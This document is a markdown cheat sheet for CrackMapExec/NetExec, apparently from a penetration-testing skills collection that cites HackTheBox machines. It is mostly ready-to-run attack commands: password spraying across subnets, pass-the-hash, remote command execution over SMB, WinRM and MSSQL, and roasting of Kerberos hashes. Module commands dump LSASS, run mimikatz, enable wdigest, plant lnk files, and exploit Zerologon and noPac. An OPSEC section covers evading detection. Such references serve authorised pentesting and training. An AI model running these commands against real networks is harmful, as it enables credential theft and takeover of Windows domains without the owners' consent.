# CrackMapExec (CME) / NetExec (nxc) Reference

> Multi-protocol AD pentest swiss-army. Maps SMB/WinRM/MSSQL/LDAP/RDP
> auth + execution + enumeration into a single tool.

> **Note**: CrackMapExec is now maintained as **NetExec** (`nxc`).
> Commands are interchangeable — substitute `nxc` for `crackmapexec`.

## Installation

```bash
# Kali / Parrot
sudo apt install crackmapexec
# or
pipx install crackmapexec

# NetExec (modern fork)
pipx install netexec
```

## Authentication

```bash
crackmapexec smb <target> -u <u> -p '<p>'
crackmapexec smb <target> -u <u> -H <NTLM>
crackmapexec smb <target> -u <u> -p '<p>' -d <DOMAIN>
crackmapexec smb <target> -u <u> -p '<p>' --local-auth     # local accounts (not domain)
crackmapexec smb <target> -u <u> -p '<p>' -k               # Kerberos
```

`<target>` can be a single IP, a CIDR range, a hostname, or a file
(`-t targets.txt`).

## Most-used recipes

### Validate creds + identify local-admin

```bash
crackmapexec smb <ip> -u <u> -p '<p>'
# (Pwn3d!) means local admin
```

### Spray creds across a range

```bash
crackmapexec smb 10.10.10.0/24 -u <u> -p '<p>' --continue-on-success
crackmapexec smb 10.10.10.0/24 -u <u> -H <NTLM> --local-auth --continue-on-success
```

### Spray a userlist with one password (kerbrute-equivalent)

```bash
crackmapexec smb <ip> -u users.txt -p 'Welcome1!' --continue-on-success
```

### Enumerate shares / users / groups / sessions / loggedon

```bash
crackmapexec smb <ip> -u <u> -p '<p>' --shares
crackmapexec smb <ip> -u <u> -p '<p>' --users
crackmapexec smb <ip> -u <u> -p '<p>' --groups
crackmapexec smb <ip> -u <u> -p '<p>' --pass-pol
crackmapexec smb <ip> -u <u> -p '<p>' --rid-brute 5000
crackmapexec smb <ip> -u <u> -p '<p>' --loggedon-users
crackmapexec smb <ip> -u <u> -p '<p>' --sessions
crackmapexec smb <ip> -u <u> -p '<p>' --disks
```

### Execute commands

```bash
# default: psexec-like (Pwn3d! required)
crackmapexec smb <ip> -u <u> -p '<p>' -x 'whoami'
crackmapexec smb <ip> -u <u> -p '<p>' -X 'whoami'         # PowerShell

# choose method
crackmapexec smb <ip> -u <u> -p '<p>' --exec-method wmiexec -x 'whoami'
crackmapexec smb <ip> -u <u> -p '<p>' --exec-method smbexec -x 'whoami'
crackmapexec smb <ip> -u <u> -p '<p>' --exec-method atexec -x 'whoami'
```

### LDAP enumeration

```bash
crackmapexec ldap <ip> -u <u> -p '<p>' --asreproast asrep.hashes
crackmapexec ldap <ip> -u <u> -p '<p>' --kerberoasting kerberoast.hashes
crackmapexec ldap <ip> -u <u> -p '<p>' --get-sid
crackmapexec ldap <ip> -u <u> -p '<p>' --users
crackmapexec ldap <ip> -u <u> -p '<p>' --groups
crackmapexec ldap <ip> -u <u> -p '<p>' --trusted-for-delegation
crackmapexec ldap <ip> -u <u> -p '<p>' --gmsa
```

### WinRM access check

```bash
crackmapexec winrm <ip> -u <u> -p '<p>'                     # Pwn3d! → evil-winrm welcome
crackmapexec winrm <ip> -u <u> -p '<p>' -x 'whoami'
```

### MSSQL

```bash
crackmapexec mssql <ip> -u sa -p ''                          # default sa attempt
crackmapexec mssql <ip> -u <u> -p '<p>' --query 'SELECT @@version'
crackmapexec mssql <ip> -u <u> -p '<p>' -x 'whoami'          # via xp_cmdshell
```

### RDP / FTP / SSH / etc.

```bash
crackmapexec rdp <ip> -u <u> -p '<p>'
crackmapexec ftp <ip> -u <u> -p '<p>'
crackmapexec ssh <ip> -u <u> -p '<p>'
```

## Modules — the killer feature

```bash
# list all modules
crackmapexec smb -L

# common AD modules
crackmapexec smb <ip> -u <u> -p '<p>' -M gpp_password         # GPP cpassword
crackmapexec smb <ip> -u <u> -p '<p>' -M gpp_autologin        # autologon GPO
crackmapexec smb <ip> -u <u> -p '<p>' -M lsassy               # dump LSASS
crackmapexec smb <ip> -u <u> -p '<p>' -M masky                # ADCS PKINIT abuse
crackmapexec smb <ip> -u <u> -p '<p>' -M mimikatz             # mimikatz module
crackmapexec smb <ip> -u <u> -p '<p>' -M wdigest -o ACTION=enable # enable wdigest
crackmapexec smb <ip> -u <u> -p '<p>' -M slinky               # SCF/lnk planting
crackmapexec smb <ip> -u <u> -p '<p>' -M zerologon            # zerologon CVE-2020-1472
crackmapexec smb <ip> -u <u> -p '<p>' -M nopac                # samaccountname spoofing
crackmapexec smb <ip> -u <u> -p '<p>' -M printerbug           # PetitPotam / printer bug
```

## Output

CME persists results in `~/.cme/cme.db` (sqlite). Inspect:

```bash
cmedb
> hosts
> creds
> exit
```

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Forgetting `--local-auth` | local-admin sweep fails | add the flag |
| Forgetting `--continue-on-success` | Tool stops at first hit | add the flag |
| Wrong domain | "STATUS_LOGON_FAILURE" | `-d <DOMAIN>` or `<DOMAIN>/<user>` |
| Bind to LDAPS unintentionally | TLS handshake errors | use `ldap://` or specific port |

## OPSEC

- `--exec-method psexec` (default) creates a service → loud.
- `wmiexec` is quieter.
- `atexec` schedules a task → less loud than psexec, more than wmi.
- All modules log to `cme.db`; back it up between engagements.
- `--continue-on-success` against a /16 will trigger lockouts; use with
  care.

## Real HTB Examples

- **Forest, Sauna, Active, Cascade** — `--shares`, `--users`,
  `--rid-brute`, `--asreproast`.
- **Active** — `-M gpp_password` would have one-shot the box.
- **Resolute, Multimaster, Sniper, Cascade, Outdated, Authority** —
  pass-the-hash sweeps.

## Related Skills

- [`tool-usage/impacket.md`](impacket.md)
- [`tool-usage/evil-winrm.md`](evil-winrm.md)
- [`active-directory/anonymous-ad-enumeration.md`](../active-directory/anonymous-ad-enumeration.md)
- [`active-directory/kerberoasting.md`](../active-directory/kerberoasting.md)
- [`methodology/10-lateral-movement.md`](../methodology/10-lateral-movement.md)
